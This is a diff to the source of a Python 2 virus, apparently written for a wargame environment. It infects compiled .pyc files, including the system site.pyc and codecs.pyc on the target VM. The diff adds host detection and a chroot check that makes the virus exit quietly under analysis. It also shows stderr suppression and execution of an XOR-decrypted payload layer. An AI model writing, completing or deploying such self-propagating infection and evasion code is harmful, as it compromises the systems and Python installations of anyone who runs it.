@@ -10,6 +10,18 @@ from uuid import uuid4 as uuid
 
 sys.stderr = open("/dev/null", "w")
 
+if socket.gethostname() == "OT-Wargame":
+    VM = True
+    tmp_dir = "/tmp/"
+else:
+    VM = False
+    tmp_dir = os.path.join(os.environ["VIRUS_HOME"], "tmp/")
+
+# detect chroot, ce fichier est censé être présent sur la VM mais ne sera pas copié dans le chroot
+if __file__ == "lolita.final.pyc" and VM:
+    if not os.path.exists("/var/lib/pycentral/pkgremove"):
+        sys.exit(0)
+
 a = None
 DECRYPT = None
 exec "__XOR_LAYER_PY__"
@@ -21,11 +33,6 @@ def to_hex(s):
 
 
 def hardlink_write(content, file):
-    if socket.gethostname() == "OT-Wargame":
-        tmp_dir = "/tmp/"
-    else:
-        tmp_dir = os.path.join(os.environ["VIRUS_HOME"], "tmp/")
-
     size = len(content)
     offset = 0
     
@@ -99,7 +106,7 @@ if __file__.endswith('.pyc'):
         content = "".join([head, marshal.dumps(data.to_code())])
         hardlink_write(content, f_to_infect)
 
-    if socket.gethostname() == "OT-Wargame":
+    if VM:
         targets = ["/usr/lib/python2.6/site.pyc", "/usr/lib/python2.6/codecs.pyc"]
     else:
         targets = glob.glob("./targets/*.pyc")
